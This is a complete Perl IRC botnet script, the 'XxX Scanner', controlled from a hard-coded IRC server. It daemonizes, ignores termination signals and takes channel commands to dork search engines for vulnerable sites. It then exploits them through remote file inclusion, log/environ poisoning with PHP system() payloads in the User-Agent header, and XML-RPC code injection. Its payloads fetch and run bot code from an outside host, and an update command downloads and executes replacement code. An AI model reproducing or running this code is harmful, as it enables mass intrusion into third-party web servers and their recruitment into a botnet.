#!/usr/bin/perl
#####################
# XxX Scanner v1.7  #
#####################

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use MIME::Base64;
use LWP::Simple;
use HTTP::Request::Common;

my $whoami = "2012.pl";
my $ircserver = "94.125.182.42";
my $ircport   = "32123";
my $nickname  = "ScaN".int(rand(1000));
my $ident     = "ScaN";
my $channel   = "#3#";
my $runner    = "XxX";
my $fullname  = "XxX";
my $ftp       = "http://tygh.interfree.it/";
my $injector  = "id.jpg";
my $phpshell  = "shell.jpg";
my $bot = "dark.jpg";
my $rficmd    = '!rfi';
my $lficmd    = '!lfi';
my $xmlcmd  = '!xml';
my $ver = "1.7";

$rfi_result   = "FeeLCoMz";
my @gdomains = ("com","de","fr","co.uk","ru","it");
my @bdomains = ("com","de","fr","uk","ru","it","jp");
my @badlink = ("wikipedia","\.google\.","feed2html","piratenpartei","pulsegate","hasicon","serverlost","honeynet","trollnet","bbhost","notanotherlabel","joomla\.","sob\.cc","torrent","facebook","voice\.fi","0day","security","overflow","demo\.","ioncube","jetlib","joomlart","osvdb","inj3ct0r","exploit","youtube","blogspot","emcjp","groovecreole","nwogeo","abuse","malware","indexoffiles","geradeauslaufen","access.log","htaccess","hack0wn","webmailhouse","rtlplus","schraubenundsaufen","rankarea","hydro-g","holydiscountservers","ichwill","spargelbaum","assist-tech","pyratz","mlsec","spam","glas-blog","awstats","error.log","wwwstats");
$lfi_test     = "../../../../../../../../../../../../../../../proc/self/environ%00";
$lfi_output   = "HTTP_USER_AGENT";

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
$ban = 0;

chdir("/tmp");
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
	if ($#_ == '1') {
	my $socket = $_[0];
	print $socket "$_[1]\n";
	} else {
		print $IRC_cur_socket "$_[0]\n";
	}
}

sub connector {
	my $mynick = $_[0];
	my $ircserver_con = $_[1];
	my $ircport_con = $_[2];
	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
	if (defined($IRC_socket)) {
		$IRC_cur_socket = $IRC_socket;
		$IRC_socket->autoflush(1);
		$sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
		$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
		nick("$mynick");
		sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
		sleep 1;
	}
}

sub parse {
	my $servarg = shift;
	if ($servarg =~ /^PING \:(.*)/) {
		sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
		if ($args =~ /^\001VERSION\001$/) {
			notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
		}
		if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/i ) {
			my $natrix = $1;
			my $arg = $2;
		}
	}
	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
		if (lc($1) eq lc($mynick)) {
			$mynick=$4;
			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		}
	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
		nick("$mynick|".int rand(999));
	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		$mynick = $2;
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
		sendraw("MODE $nickname +Bix");
		sendraw("JOIN $channel");
		sendraw("PRIVMSG $channel :15,1XxX Scanner v$ver Launched!");
	}
}

my $line_temp;
while( 1 ) {
	while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
	delete($irc_servers{''}) if (defined($irc_servers{''}));
	my @ready = $sel_client->can_read(0);
	next unless(@ready);
	foreach $fh (@ready) {
		$IRC_cur_socket = $fh;
		$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
		$nread = sysread($fh, $msg, 4096);
		if ($nread == 0) {
			$sel_client->remove($fh);
			$fh->close;
			delete($irc_servers{$fh});
		}
		@lines = split (/\n/, $msg);
		$msg =~ s/\r\n$//;

		#####################################################################
		############################[ CMD LIST ]#############################
		#####################################################################

		if ($msg=~ /PRIVMSG $channel :$nickname !help/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 $rficmd <bug> <dork> | $lficmd <bug> <dork> ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 $mysqlcmd / $mssqlcmd <bug> <dork> ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 !id | !engine | !pid | !version ");
		}

		if ($msg=~ /PRIVMSG $channel :!id\s*(.*)/i){
			my $ref = $1;
			if ($1) { response($ref); } else { response(); }
		}

		if ($msg=~ /PRIVMSG $channel :$nickname !restart/i) {
			exec ("kill -9 `pidof perl`; perl /tmp/2012.pl");
		}	

		if ($msg=~ /PRIVMSG $channel :$nickname !update\s+(.*)/i) {
			exec ("curl -o /tmp/2012.pl $1; wget -O /tmp/2012.pl $1; kill -9 `pidof perl`; perl /tmp/2012.pl");
		}			
		
		if ($msg=~ /PRIVMSG $channel :!version/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Version15)10 XxX Scanner v$ver");
		}

		if ($msg=~ /PRIVMSG $channel :!engine/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Engine15)10 Google, Cuil, Bing, Baidu, ASK, Yahoo, AllTheWeb, AltaVista, UOL.");
		}

		if ($msg=~ /PRIVMSG $channel :!newid\s+(.*)/i){
			$ftp = $1;
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8NEWID15)10 ");
		}

		###############################[ RFI ]###############################
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					sendraw($IRC_cur_socket, "NICK :[RFI]$nickname");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Dork:15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 File:15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 ID:15 ".$path.$injector);
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Search Engine Loading ...");
					rfiscan($bugx,$d0rk,$path);
				}
				exit;
			}
		}

		###############################[ LFI ]###############################
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					sendraw($IRC_cur_socket, "NICK :[LFI]$nickname");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Dork :15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 File :15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Search Engine Loading ...");
					lfiscan($bugx,$d0rk,$path);
				}
				exit;
			}
		}
		
		###############################[ XML ]###############################
		if ($msg=~ /PRIVMSG $channel :$nickname $xmlcmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					sendraw($IRC_cur_socket, "NICK :[XML]$nickname");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)10 Dork :15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)10 File :15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)10 Search Engine Loading ...");
					xmlscan($bugx,$d0rk,$path);
				}
				exit;
			}
		}		
		
		for(my $c=0; $c<= $#lines; $c++) {
			$line = $lines[$c];
			$line=$line_temp.$line if ($line_temp);
			$line_temp='';
			$line =~ s/\r$//;
			unless ($c == $#lines) {
				parse("$line");
			} else {
				if ($#lines == 0) {
					parse("$line");
				} elsif ($lines[$c] =~ /\r$/) {
					parse("$line");
				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
					parse("$line");
				} else {
					$line_temp = $line;
				}
			}
		}
	}
}

##################################################################### Procedure

sub rfiscan() {
	my $bugz = $_[0];
	my $dork = $_[1];
	my $path = $_[2];
	my $contatore = 0;
	my @results = cerca("RFI", $dork);
	if (scalar(@results) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Exploiting15 $dork");
	}
	my $uni=scalar(@results);	
	if ($_[2]) { $botz = $path.$bot; } else { $botz = $ftp.$bot; }
	foreach my $target (@results)	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Scan Finish for15 $dork");
			sendraw($IRC_cur_socket, "NICK :$nickname");
		}
		if ($_[2]) { $xpl  = "http://".$target.$bugz.$path.$injector."??"; } else { $xpl  = "http://".$target.$bugz.$ftp.$injector."??"; }
		if ($_[2]) { $vuln = "http://".$target."3".$bugz."7".$path.$phpshell."??"; } else { $vuln = "http://".$target."3".$bugz."7".$ftp.$phpshell."??"; }
		my $re = getcontent($xpl);
		sleep(1);
		if($re =~ /$rfi_result/i && $re =~ /uid=/i) {
			os($xpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7\@13Vulnerable15)15 ".$vuln." 15(7\@6OS: ".$os."15)(74Safe: OFF15)");
			$xpl2  = "http://".$target.$bugz.$botz."??";
			my $re = getcontent($xpl2);
		} elsif($re =~ /$rfi_result/i) {
			os($xpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7\@13Vulnerable15)15 ".$vuln." 15(7\@6OS: ".$os."15)(79Safe: ON15)");
			$xpl2  = "http://".$target.$bugz.$botz."??";
			my $re = getcontent($xpl2);
		}
		sleep(1);
	}
}

sub lfiscan() {
	my $bugz = $_[0];
	my $dork = $_[1];
	my $path = $_[2];	
	my $contatore = 0;	
	my @results = cerca("LFI",$dork);	
	if (scalar(@results) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Exploiting15 $dork");
	}
	my $uni=scalar(@results);
	if ($_[2]) { $botz = $path.$bot; } else { $botz = $ftp.$bot; }
	$comando = "curl -o /tmp/dark.jpg ".$botz.";wget -O /tmp/dark.jpg ".$botz.";php /tmp/dark.jpg;";
	foreach my $target (@results)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Scan Finish for15 $dork");
			sendraw($IRC_cur_socket, "NICK :$nickname");
		}
		injectlog($target,$bugz,$lfi_test,$comando,$botz);
		sleep(1);
	}
}

sub xmlscan() {
	my $bugz = $_[0];
	my $dork = $_[1];
	my $path = $_[2];	
	my $contatore = 0;	
	my @results = cerca("XML",$dork);	
	if (scalar(@results) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)10 Exploiting15 $dork");
	}
	my $uni=scalar(@results);
	#if ($_[2]) { $botz = $path.$bot; } else { $botz = $ftp.$bot; }
	#my $comando = "curl -o /tmp/dark.jpg ".$botz.";wget -O /tmp/dark.jpg ".$botz.";php /tmp/dark.jpg";
	foreach my $target (@results)	{
		$contatore++;
		if ($contatore==$uni-1) {
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)10 Scan Finish for15 $dork");
			sendraw($IRC_cur_socket, "NICK :$nickname");
		}
		my $url = "http://".$target.$bugz;
		my $userAgent = LWP::UserAgent->new(agent => 'Mozilla/5.0', timeout => '10');
		my $exploit = "<?xml version=\"1.0\"?><methodCall>";
		   $exploit .= "<methodName>test.method</methodName>";
		   $exploit .= "<params><param><value><name>',''));";
		   #$exploit .= "echo 'XxXXxX';echo `".$comando."`;exit;/*</name></value></param></params></methodCall>";
		   $exploit .= "echo 'XxXDIOCANEXxX';exit;/*</name></value></param></params></methodCall>";
		my $response = $userAgent->request(POST $url, Content_Type => 'text/xml', Content => $exploit);
			if ($response->content =~ /XxXDIOCANEXxX/i) { 
				sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8XML15)(7@10Vulnerable15) http://".$target.$bugz);
			}
		sleep(1);
	}
}

sub cerca() {
	my $tipo = $_[0];
	my $dork = $_[1];
	my $num = 0;	
	my @total,@target,@clean,@google,@cuil,@baidu,@Bing,@ask,@yahoo,@altavista,@uol,@alltheweb = ();
	@google = google($dork);
	push(@total, @google);
	if ($ban == 0) { 
		if (scalar(@google)) {
		$num = scalar(@google);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Google15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Google15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Google15)4 Banned!");
	}	
	@cuil = cuil($dork);
	push(@total, @cuil);
	if ($ban == 0) { 
		if (scalar(@cuil)) {
		$num = scalar(@cuil);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Cuil15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Cuil15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Cuil15)4 Banned!");
	}
	@altavista = altavista($dork);
	push(@total, @altavista);
	if ($ban == 0) { 
		if (scalar(@altavista)) {
		$num = scalar(@altavista);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AltaVista15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AltaVista15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AltaVista15)4 Banned!");
	}
	@uol = uol($dork);
	push(@total, @uol);
	if ($ban == 0) { 
		if (scalar(@uol)) {
		$num = scalar(@uol);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11UOL15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11UOL15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11UOL15)4 Banned!");
	}
	@alltheweb = alltheweb($dork);
	push(@total, @alltheweb);
	if ($ban == 0) { 
		if (scalar(@alltheweb)) {
		$num = scalar(@alltheweb);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AllTheWeb15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AllTheWeb15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11AllTheWeb15)4 Banned!");
	}	
	@baidu = baidu($dork);
	push(@total, @baidu);
	if ($ban == 0) { 
		if (scalar(@baidu)) {
		$num = scalar(@baidu);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Baidu15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Baidu15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Baidu15)4 Banned!");
	}
	@Bing = Bing($dork);
	push(@total, @Bing);
	if ($ban == 0) { 
		if (scalar(@Bing)) {
		$num = scalar(@Bing);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Bing15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Bing15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Bing15)4 Banned!");
	}
	@ask = ask($dork);
	push(@total, @ask);
	if ($ban == 0) { 
		if (scalar(@ask)) {
		$num = scalar(@ask);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Ask15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Ask15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Ask15)4 Banned!");
	}
	@yahoo = yahoo($dork);
	push(@total, @yahoo);
	if ($ban == 0) { 
		if (scalar(@yahoo)) {
		$num = scalar(@yahoo);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Yahoo15) 9(".$num.")");
		} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Yahoo15)5 0");		
		}
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@11Yahoo15)4 Banned!");
	}
	@target = calculate(@total);
	@clean = filter(@target);
	if (scalar(@clean)) {
	$num = scalar(@clean);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@12Total15) 9(".$num.")");
	} else {
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8$tipo15)(7@12Total15)5 0");		
	}
	return @clean;
}

sub os() {
	my $site = $_[0];
	my $re = query($site);
	while ($re =~ m/<br>os:(.+?)<br>/ig) {
		$os = $1;
		if ($os == "") { $os = "Unknown"; }
	}
}

sub response() {
	my $path = $_[0];
	if ($_[0]) { $re = getcontent($path.$injector); } else { $re = getcontent($ftp.$injector); }
    if ($re =~ /$rfi_result/i) {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :10«9ONLINE10»");
    }
    else {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :10«4OFFLINE10»");
    }
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(10);
    my $response = $ua->request($req);
    return $response->content;
}

sub google() {
	my @lst = ();
	$ban = 0;
	my $key = $_[0];
	foreach my $tld ( @gdomains ) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Google[$tld]15) Started.");
		my $pag = 0;
		my $Go = "http://www.google.".$tld."/search?q=".key($key)."&num=100&filter=0&start=".$pag;
		my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1; return @lst;
	#	}	
		while ($Res =~ /display:block;margin-left:53px/) {
			while ($Res =~ m/<a href="http:\/\/(.+?)"/g) {
				if ($1 !~ /google/){		
					my $k=$1;
					my @grep=links($k);
					push(@lst,@grep);				
				}			
			}
			$pag += 100;
			$Go = "http://www.google.".$tld."/search?q=".key($key)."&num=100&filter=0&start=".$pag;
			sleep(1);
			$Res=query($Go);	
		}
	}
	return @lst;
}

sub cuil() {
    my @lst = ();
	$ban = 0;
    my $key = $_[0];
    my $Go= "http://www.cuil.com/search?q=".key($key);
	my $Res=query($Go);
	while ($Res =~ /id="a_next" href="(.*?)">/) {
		my $next = $1;
		while ($Res =~ m/<a class="url" href="http:\/\/(.*?)"/g) {
			my $k=$1;
			my @grep=links($k);
			push(@lst,@grep);
		}
		sleep(1);
		$Res=query("http://www.cuil.com/search".$next);
	}
	return @lst;
}

sub alltheweb() {
    my @lst = ();
	$ban = 0;
    my $key = $_[0];
	my $pag = 0;
	my $Go = "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$pag;
	my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1; return @lst;
	#	}	
	while ($Res =~ /Next<\/a>/) {
		while ($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g) {
			my $k=$1;
			my @grep=links($k);
			push(@lst,@grep);				
		}			
		$pag += 100;
		$Go = "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$pag;
		sleep(1);
		$Res=query($Go);	
    }
    return @lst;
}

sub uol() {
    my @lst = ();
	$ban = 0;
    my $key = $_[0];
	my $pag = 1;
	my $Go = "http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$pag;
	my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1; return @lst;
	#	}	
	while ($Res =~ /start=.*?" class="next">pr/) {
		while ($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
			if ($1 !~ /busca|uol|yahoo/){	
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);				
			}
		}			
		$pag += 10;
		$Go = "http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$pag;
		sleep(1);
		$Res=query($Go);	
    }
    return @lst;
}

sub altavista() {
    my @lst = ();
	$ban = 0;
    my $key = $_[0];
	my $pag = 1;
	my $Go = "http://www.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$pag;
	my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1; return @lst;
	#	}	
	while ($Res =~ /target="_self">Next/) {
		while ($Res =~ m/<span class=ngrn>(.+?)\//g) {
			if ($1 !~ /altavista/){	
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);				
			}
		}			
		$pag += 10;
		$Go = "http://www.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$pag;
		sleep(1);
		$Res=query($Go);	
    }
    return @lst;
}

sub baidu() {
    my @lst = ();
	$ban = 0;
	my $pag = 0;
    my $key = $_[0];
    my $Go = "http://www.baidu.com/s?wd=".key($key);
	my $Res=query($Go);
#	if ($Res =~ //) { 
#		$ban = 1; return @lst;
#	}	
	while ($Res =~ /<\/font><\/a>&nbsp;<\/div>/) {
		while ($Res =~ m/href="http:\/\/(.+?)"/g) {
            if ($1 !~ /baidu/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);	
            }			
		}
		$pag += 10;
		$Go = "http://www.baidu.com/s?wd=".key($key)."&pn=".$pag;
		sleep(1);
		$Res=query($Go);
	}
	return @lst;	
}

sub Bing() {
	my @lst = ();
	$ban = 0;
	my $key = $_[0];
	foreach my $tld ( @bdomains ) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Bing[$tld]15) Started");	
		my $pag = 1;
		my $Go = "http://www.bing.com/search?q=".key($key)."&filt=all&first=".$pag."&cc=".$tld;
		my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1; return @lst;
	#	}	
		while ($Res =~ /class="sb_pagN"/) {
			while ($Res =~ m/<a href=\"http:\/\/(.+?)"/g) {
				if ($1 !~ /msn|live|bing|microsoft/){		
					my $k=$1;
					my @grep=links($k);
					push(@lst,@grep);					
				}			
			}
			$pag += 10;
			$Go = "http://www.bing.com/search?q=".key($key)."&filt=all&first=".$pag."&cc=".$tld;
			sleep(1);
			$Res=query($Go);	
		}
	}	
	return @lst;	
}

sub ask() {
    my @lst = ();
	$ban = 0;
	my $pag = 1;
    my $key = $_[0];
    my $Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
	my $Res=query($Go);
	if ($Res =~ //) { 
		$ban = 1; return @lst;
	}	
	while ($Res =~ />Next/) {
		while ($Res =~ m/href="http:\/\/(.+?)" onmousedown=/g) {
            if ($1 !~ /ask\.com|cache/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);				
            }			
		}
		$pag += 1;
		$Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
		sleep(1);
		$Res=query($Go);		
	}
return @lst;
}

sub yahoo() {
    my @lst = ();
	$ban = 0;
	my $pag = 1;	
    my $key = $_[0];
    my $Go = "http://search.yahoo.com/search?p=".key($key)."&b=".$pag;
	my $Res=query($Go);
	if ($Res =~ /-- Viruses --/) { 
		$ban = 1; return @lst;
	}
	while ($Res =~ /id="pg-next"/) {
		while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);
            }			
		}
		$pag += 10;
		$Go = "http://search.yahoo.com/search?p=".key($key)."&b=".$pag;
		sleep(1);
		$Res=query($Go);
	}
return @lst;	
}

sub injectlog() {
    my $host = $_[0];
	my $bug = $_[1];
	my $lfi = $_[2];
	my $comando = $_[3];
	my $botz = $_[4];
	my $php = "<?php system('$comando'); ?>";
	my $php2 = "<?php exec('$comando'); ?>";
	my $php3 = "<?php include('".$botz."'); ?>";
	my $ua = LWP::UserAgent->new();
	$ua->timeout(10);
	$ua->agent($php);
	$response = $ua->get("http://".$host.$bug.$lfi);
	$ua->agent($php2);
	$response2 = $ua->get("http://".$host.$bug.$lfi);
	$ua->agent($php3);
	$response3 = $ua->get("http://".$host.$bug.$lfi);	
	if ($response->content =~ /$lfi_output/ || $response2->content =~ /$lfi_output/ || $response3->content =~ /$lfi_output/) { 
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@10Vulnerable15) http://".$host.$bug.$lfi);
	}
	sleep(1);
}

sub links() {
	my @l;
	my $link = $_[0];
	my $host = $_[0];
	my $hdir = $_[0];
	$hdir =~ s/(.*)\/[^\/]*$/\1/;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host .= "/";
	$hdir .= "/";
	$host =~ s/\/\//\//g;
	$hdir =~ s/\/\//\//g;
	$link =~ s/\/\//\//g;
	push( @l, $link, $host, $hdir );
	return @l;
}

sub key() {
	my $dork = $_[0];
	$dork =~ s/ /\+/g;
	$dork =~ s/:/\%3A/g;
	$dork =~ s/\//\%2F/g;
	$dork =~ s/&/\%26/g;
	$dork =~ s/\"/\%22/g;
	$dork =~ s/,/\%2C/g;
	$dork =~ s/\\/\%5C/g;
	return $dork;
}

sub query() {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host  = $url;
	my $query = $url;
	my $page  = "";
	$host  =~ s/href=\"?http:\/\///;
	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ( $query eq "" ) { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
			my @r = <$sock>;
			$page = "@r";
			close($sock);
		};
	return $page;
}

sub calculate() {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub filter() {
  my @filtro = ();
  foreach my $url ( @_ ) {
    my $checkhost = 0;
    foreach my $b ( @badlink ) {
      if ($url =~ /$b/) { $checkhost = 1; }
    }
    if ($checkhost == 0) { push (@filtro, $url); }
  }
  return @filtro;
}

sub nick() {
	return unless $#_ == 0;
	sendraw("NICK $_[0]");
}

sub notice() {
	return unless $#_ == 1;
	sendraw("NOTICE $_[0] :$_[1]");
}
#5.2#
